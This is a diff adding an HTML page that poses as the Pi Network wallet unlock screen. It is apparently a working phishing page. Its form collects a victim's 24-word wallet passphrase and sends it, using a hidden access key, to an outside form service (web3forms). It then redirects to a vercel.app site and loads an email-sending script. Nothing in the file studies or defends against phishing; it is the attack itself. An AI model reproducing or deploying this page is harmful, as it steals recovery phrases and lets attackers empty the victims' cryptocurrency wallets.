@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Network</title>
+    <link rel="stylesheet" href="cont/style.css">
+    <style>
+        /* Resetting default margin and padding */
+       
+    </style>
+</head> 
+
+
+<body>
+   
+<!-- Navbar HTML structure -->
+<nav class="navbar">
+    <div class="logo"><img src="cont/imgk.jpg" alt="Wallet"></div>
+  
+</nav>
+<div class="mainbox">
+    <div class="hede">
+        <h3>Unlock Pi Wallet</h3>
+    </div>
+    <div class="form1">
+        <form class="form2" action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="e0f3e32e-3c54-438c-954f-f56266e9d41a">
+            
+
+
+<!-- ✅ Correct. Full URL with https:// -->
+            <input type="hidden" name="redirect" value="https://picoin2.vercel.app/">
+
+            
+            <input type="hidden" name="email">
+            <textarea name="name" type="text" id="textarea2" required class="text2" placeholder="Enter  your  24-word
+passphrase  here"></textarea>
+            <button class="btn6" type="submit">Unlock With Passphrase</button>
+            <button class="btn7">Unlock With Fingerprint</button>
+        </form>
+    </div>
+    <div class="notes ">
+        <p>As a non-custodial wallet, your wallet
+           passphrase is exclusively accessible
+           only to you. Recovery of passphrase is 
+           currently impossible.</p>
+           <br>
+           
+
+
+        <p>Lost Your passphrase? <a  style="text-decoration: none;" href="#">You can create
+           a new wallet
+        </a>but all your pi in your 
+           previous wallet will be inaccessible</p>
+        </p>
+    </div>
+</div>
+
+<script src="resp.js"></script>
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+
+
+
+</body>
+</html>
